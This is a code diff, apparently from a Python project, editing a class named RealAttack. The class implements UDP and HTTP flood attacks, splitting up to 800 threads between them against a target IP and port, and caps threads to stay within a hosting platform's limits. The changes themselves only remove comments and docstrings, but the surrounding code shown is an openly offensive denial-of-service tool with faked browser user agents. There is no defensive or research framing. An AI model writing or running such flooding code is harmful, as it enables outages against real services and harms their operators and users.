@@ -4,7 +4,6 @@ import random
 import time
 import ssl
 import http.client
-import struct
 
 class RealAttack:
     def __init__(self):
@@ -15,7 +14,6 @@ class RealAttack:
         self.start_time = 0
     
     def udp_flood(self, ip, port, end):
-        """UDP Flood"""
         sockets = []
         for _ in range(5):
             try:
@@ -55,7 +53,6 @@ class RealAttack:
                 pass
     
     def http_flood(self, ip, port, end):
-        """HTTP Flood"""
         user_agents = [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15'
@@ -93,7 +90,6 @@ class RealAttack:
                 pass
     
     def start(self, ip, port, dur, threads=800):
-        """🔥 Start Attack - Thread Limit Fixed"""
         self.on = True
         self.pkts = 0
         self.bytes_out = 0
@@ -101,12 +97,10 @@ class RealAttack:
         
         end = time.time() + dur
         
-        # 🔥 THREAD LIMIT - RAILWAY SAFE
+        # 🔥 RAILWAY SAFE LIMIT
         if threads > 1000:
             threads = 800
-            print(f"⚠️ Threads limited to 800 for Railway")
         
-        # 🔥 DISTRIBUTE THREADS
         udp_t = int(threads * 0.6)
         http_t = int(threads * 0.4)
         
